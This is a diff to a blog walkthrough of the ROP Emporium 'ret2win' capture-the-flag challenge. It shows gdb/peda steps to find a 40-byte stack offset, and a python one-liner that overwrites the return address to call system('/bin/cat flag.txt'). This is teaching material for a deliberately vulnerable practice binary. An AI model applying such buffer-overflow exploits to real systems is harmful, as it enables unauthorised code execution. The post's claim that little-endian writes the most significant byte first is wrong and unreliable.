@@ -20,7 +20,8 @@ You'll require a few tools before you begin, but we'll use minimal tooling for t
 * checksec - This is used to identify the protections used on the binary
 
 To install these on Debian simply run the following commands:
-```
+
+```bash
 $ sudo apt-get update
 $ sudo apt-get install gdb git checksec
 $ git clone https://github.com/longld/peda.git ~/peda
@@ -32,7 +33,8 @@ $ echo "source ~/peda/peda.py" >> ~/.gdbinit
 Jump on over to ropemporium and download the first challenge. This is called ret2win. For this post we're using the x86_64 binary.
 
 Let's have a look at what protections ret2win uses:
-```
+
+```bash
 $ checksec --file ./ret2win
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols	No	0		6	./ret2win
@@ -42,7 +44,8 @@ It's always a good idea to have a look at this, even though we're doing ROP chai
 ### any juicy functions?
 
 Let's have a look at what functions there are within the program:
-```
+
+```bash
 gdb ./ret2win
 gdb-peda$ info functions
 All defined functions:
@@ -72,7 +75,8 @@ Non-debugging symbols:
 There are 2 functions that look interesting here 'pwnme' and 'ret2win'. Let's take a closer look at these.
 
 We can disassemble 'pwnme' by running the following command.
-```
+
+```bash
 gdb-peda$ disassemble pwnme
 Dump of assembler code for function pwnme:
    0x00000000004006e8 <+0>:	push   rbp
@@ -108,7 +112,8 @@ End of assembler dump.
 There are a few 'puts' commands, a printf, what are they outputting? We can read those memory addresses by running 'x/s' followed by the address.
 * x = eXamine
 * s = string
-```
+
+```bash
 gdb-peda$ x/s 0x400838
 0x400838:	"For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!"
 gdb-peda$ x/s 0x400898
@@ -117,7 +122,8 @@ gdb-peda$ x/s 0x4008b8
 0x4008b8:	"You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
 ```
 It looks like this is just standard string used by the start up of the program. Nothing really of use here. Let's have a look at 'ret2win'.
-```
+
+```bash
 gdb-peda$ disassemble ret2win 
 Dump of assembler code for function ret2win:
    0x0000000000400756 <+0>:	push   rbp
@@ -134,7 +140,7 @@ End of assembler dump.
 
 Looks like it also calls puts, but wait a second, it's calling 'system' this is very interesting function. We can have a look at what system does by running 'man system' in another terminal.
 
-```
+```bash
 $ man system
 
 SYNOPSIS
@@ -146,20 +152,23 @@ The system() library function uses fork(2) to create a child process that execut
 ```
 
 This basically gives us command execution, all it requires is you pass it 1 argument which contains your command. We can verify this from the disassembled function. I've copied it below to make it easier to read:
-```
+
+```bash
    0x0000000000400764 <+14>:	mov    edi,0x400943          <-- Move into edi, whatever is in 0x400943
    0x0000000000400769 <+19>:	call   0x400560 <system@plt> <-- Execute system()
 ```
 
 Let's take a look at what is in that memory address, using eXamine like we did before:
-```
+
+```bash
 gdb-peda$ x/s 0x400943
 0x400943:	"/bin/cat flag.txt"
 ```
 This function calls system(/bin/cat flag.txt) which is exactly what we want to achieve. This means that we need to identify the address of this function and then figure out for the binary to divert to this address.
 
 We can simply run the following inside gdb to find the address of the function:
-```
+
+```bash
 gdb-peda$ info addr ret2win
 Symbol "ret2win" is at 0x400756 in a file compiled without debugging.
 ```
@@ -182,7 +191,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 So, when we provided the program 100 A's it crashed the program. This is exactly what we want. That means the data we provided must have overwritten some address required on the stack. Let's take a look at the registers:
 
-```
+```bash
 [----------------------------------registers-----------------------------------]
 RAX: 0xb ('\x0b')
 RBX: 0x0 
@@ -207,13 +216,15 @@ EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow
 It looks like our data has overwritten the RBP (Base Pointer) and the RSP (Stack Pointer), but not the RIP (Instruction Pointer). This means we should be able to take control of execution by controlling the RSP. Let's see if we can more accurately guess where in the data we provided this address would be. To do this we can create a pattern of data then execute the program using that pattern. When the program crashes again, we can check what the RSP is, and cross reference it, with the pattern to identify the offset. Luckily we can use Peda to do most of the work for us:
 
 1. create the pattern
-```
+
+```bash
 gdb-peda$ pattern_create 100
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 ```
 
 2. run the program using the pattern
-```
+
+```bash
 gdb-peda$ run < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")')
 Starting program: /home/user/Downloads/ropemporium/ret2win < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")')
 ret2win by ROP Emporium
@@ -242,14 +253,15 @@ EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow
 ```
 
 3. check the offset of the pattern using pattern_offset
-```
+
+```bash
 gdb-peda$ pattern_offset AA0AAFAAbAA1AAGA
 AA0AAFAAbAA1AAGA found at offset: 40
 ```
 
 pattern_offset identified that the offset was 40 bytes, this means we should be able to control the RSP by providing 40 bytes + 8 bytes for the address of RSP. Let's double check this is correct by using python:
 
-```
+```bash
 gdb-peda$ run < <(python -c 'print("A"*40 + "B"*8)')
 
 <REDUCED FOR BREVITY>
@@ -261,7 +273,7 @@ RIP: 0x400755 (<pwnme+109>:	ret)
 
 Now we'll grab the memory address for ret2win, and replace the B's with that. Don't forget we'll be using little-endian, so we'll be writing it with the most significant byte first.
 
-```
+```bash
 gdb-peda$ info addr ret2win
 Symbol "ret2win" is at 0x400756 in a file compiled without debugging.
 
@@ -291,7 +303,7 @@ ROPE{a_placeholder_32byte_flag!}                         <-- We did it!
 
 Let's just double check this all works outside of the debugger. Copy and paste your python line, exit the GDB, then pipe the python command to the binary:
 
-```
+```bash
 $ python -c 'print("A" * 40 + "\x56\x07\x40\x00\x00\x00\x00\x00")' | ./ret2win 
 ret2win by ROP Emporium
 x86_64
